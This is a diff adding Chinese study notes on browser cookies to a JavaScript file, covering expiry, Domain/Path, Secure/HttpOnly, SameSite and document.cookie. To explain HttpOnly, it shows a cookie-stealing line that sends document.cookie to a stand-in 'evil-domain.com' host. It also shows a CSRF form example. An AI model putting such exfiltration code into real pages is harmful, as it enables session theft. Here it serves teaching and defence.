@@ -137,3 +137,200 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry
 Cookie 的各种属性，比如何时过期。
 哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。
 */
+
+// 3. Cookie 的属性
+// 3.1 Expires，Max-Age
+// Expires属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。
+// 它的值是 UTC 格式，可以使用Date.prototype.toUTCString()进行格式转换。
+
+// Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
+
+// 如果不设置该属性，或者设为null，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，
+// 该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，
+// 所以没有办法保证 Cookie 一定会在服务器指定的时间过期。
+
+// Max-Age属性指定从现在开始 Cookie 存在的秒数，比如60 * 60 * 24 * 365（即一年）。
+// 过了这个时间以后，浏览器就不再保留这个 Cookie。
+
+// 如果同时指定了Expires和Max-Age，那么Max-Age的值将优先生效。
+
+// 如果Set-Cookie字段没有指定Expires或Max-Age属性，那么这个 Cookie 就是 Session Cookie，
+// 即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。
+
+// 3.2 Domain，Path
+/*
+Domain属性指定 Cookie 属于哪个域名，以后浏览器向服务器发送 HTTP 请求时，通过这个属性判断是否要附带某个 Cookie。
+
+服务器设定 Cookie 时，如果没有指定 Domain 属性，浏览器会默认将其设为浏览器的当前域名。如果当前域名是一个 IP 地址，
+则不得设置 Domain 属性。
+
+如果指定 Domain 属性，需要遵守下面规则：Domain 属性只能是当前域名或者当前域名的上级域名，但设为上级域名时，
+不能设为顶级域名或公共域名。（顶级域名指的是 .com、.net 这样的域名，公共域名指的是开放给外部用户设置子域名的域名，
+比如 github.io。）如果不符合上面这条规则，浏览器会拒绝设置这个 Cookie。
+
+举例来说，当前域名为x.y.z.com，那么 Domain 属性可以设为x.y.z.com，或者y.z.com，或者z.com，但不能设为foo.x.y.z.com，
+或者another.domain.com。
+
+另一个例子是，当前域名为wangdoc.github.io，则 Domain 属性只能设为wangdoc.github.io，不能设为github.io，
+因为后者是一个公共域名。
+
+浏览器发送 Cookie 时，Domain 属性必须与当前域名一致，或者是当前域名的上级域名（公共域名除外）。
+比如，Domain 属性是y.z.com，那么适用于y.z.com、x.y.z.com、foo.x.y.z.com等域名。
+再比如，Domain 属性是公共域名github.io，那么只适用于github.io这个域名本身，不适用于它的子域名wangdoc.github.io。
+
+Path属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，Path属性是 HTTP 请求路径的开头一部分，
+就会在头信息里面带上这个 Cookie。比如，Path属性是/，那么请求/docs路径也会包含该 Cookie。
+当然，前提是 Domain 属性必须符合条件。
+*/
+
+// 3.3 Secure，HttpOnly
+/*
+Secure属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。
+另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的Secure属性。
+该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。
+
+HttpOnly属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是document.cookie属性、XMLHttpRequest对象
+和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。
+*/
+
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+
+// 上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。
+// 如果设置了一个 Cookie 的HttpOnly属性，上面代码就不会读到该 Cookie。
+
+// 3.4 SameSite
+// Chrome 51 开始，浏览器的 Cookie 新增加了一个SameSite属性，用来防止 CSRF 攻击和用户追踪。
+
+// Cookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 Cookie 的 HTTP 请求，这就是 CSRF 攻击。
+// 举例来说，用户登陆了银行网站your-bank.com，银行服务器发来了一个 Cookie。
+
+/*Set-Cookie:id=a3fWa;*/
+
+// 用户后来又访问了恶意网站malicious.com，上面有一个表单。
+<form action="your-bank.com/transfer" method="POST">
+  ...
+</form>;
+
+// 用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的请求。
+// 为了防止这种攻击，官网的表单一般都带有一个随机 token，官网服务器通过验证这个随机 token，确认是否为真实请求。
+
+<form action="your-bank.com/transfer" method="POST">
+  <input type="hidden" name="token" value="dad3weg34">
+    ...
+  </input>
+</form>;
+
+// 这种第三方网站引导而附带发送的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。
+// 比如，Facebook 在第三方网站插入一张看不见的图片。
+
+<img src="facebook.com" style="visibility:hidden;"></img>;
+
+// 浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，从而 Facebook 就会知道你是谁，访问了什么网站。
+
+// Cookie 的SameSite属性用来限制第三方 Cookie，从而减少安全风险。它可以设置三个值。
+/*
+- Strict
+- Lax
+- None
+*/
+
+//（1）Strict
+// Strict最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。
+// 换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。
+/* Set-Cookie: CookieName=CookieValue; SameSite=Strict; */
+
+// 这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，
+// 用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。
+
+//（2）Lax
+// Lax规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。
+/* Set-Cookie: CookieName=CookieValue; SameSite=Lax; */
+
+// 导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。
+/*
+请求类型	                  示例	                                         正常情况	        Lax
+链接	             <a href="..."></a>	                                 发送 Cookie	   发送 Cookie
+预加载	      <link rel="prerender" href="..."/>	                     发送 Cookie	   发送 Cookie
+GET 表单	     <form method="GET" action="...">	                       发送 Cookie	  发送 Cookie
+POST 表单	     <form method="POST" action="...">	                     发送 Cookie   	不发送
+iframe	       <iframe src="..."></iframe>	                          发送 Cookie	   不发送
+AJAX	              $.get("...")	                                    发送 Cookie	   不发送
+Image	            <img src="...">	                                    发送 Cookie    不发送
+
+*/
+
+// 设置了Strict或Lax以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。
+
+//（3）None
+// Chrome 计划将Lax变为默认设置。这时，网站可以选择显式关闭SameSite属性，将其设为None。
+// 不过，前提是必须同时设置Secure属性（Cookie 只能通过 HTTPS 协议发送），否则无效。
+
+// 下面的设置无效。
+/* Set-Cookie: widget_session=abc123; SameSite=None */
+
+// 下面的设置有效。
+/* Set-Cookie: widget_session=abc123; SameSite=None; Secure */
+
+// 4. document.cookie
+// document.cookie属性用于读写当前网页的 Cookie。
+// 读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有HTTPOnly属性。
+
+document.cookie; // "foo=bar;baz=bar"
+
+// 上面代码从document.cookie一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。
+var cookie = document.cookie.split(";");
+
+for (var i = 0; i < cookie.length; i++) {
+  console.log(cookie[i]);
+}
+// foo=bar
+// baz=bar
+
+// document.cookie属性是可写的，可以通过它为当前网站添加 Cookie。
+document.cookie = "fontSize=14";
+
+// 写入的时候，Cookie 的值必须写成key=value的形式。注意，等号两边不能有空格。
+// 另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），
+// 这可以用encodeURIComponent方法达到。
+
+// 但是，document.cookie一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。
+document.cookie = "test1=hello";
+document.cookie = "test2=world";
+document.cookie;
+// test1=hello;test2=world
+
+// document.cookie读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。
+// 浏览器向服务器发送 Cookie 的时候，Cookie字段是使用一行将所有 Cookie 全部发送；
+// 服务器向浏览器设置 Cookie 的时候，Set-Cookie字段是一行设置一个 Cookie。
+
+// 写入 Cookie 的时候，可以一起写入 Cookie 的属性。
+document.cookie = "foo=bar; expires=Fri, 31 Dec, 2020 23:59:59 GMT";
+// 上面代码中，写入 Cookie 的时候，同时设置了expires属性。属性值的等号两边，也是不能有空格的。
+
+/*
+各个属性的写入注意点如下。
+
+- path属性必须为绝对路径，默认为当前路径。
+- domain属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是example.com，就不能将其设为foo.com。
+  该属性默认为当前的一级域名（不含二级域名）。
+- max-age属性的值为秒数。
+- expires属性的值为 UTC 格式，可以使用Date.prototype.toUTCString()进行日期格式转换。
+*/
+
+// document.cookie写入 Cookie 的例子如下。
+document.cookie =
+  "fontSize=14; " +
+  "expires=" +
+  someDate.toGMTString() +
+  "; " +
+  "path=/subdirectory; " +
+  "domain=*.example.com";
+
+// Cookie 的属性一旦设置完成，就没有办法读取这些属性的值
+
+// 删除一个现存 Cookie 的唯一方法，是设置它的expires属性为一个过去的日期。
+
+document.cookie = "fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT";
+
+// 上面代码中，名为fontSize的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。
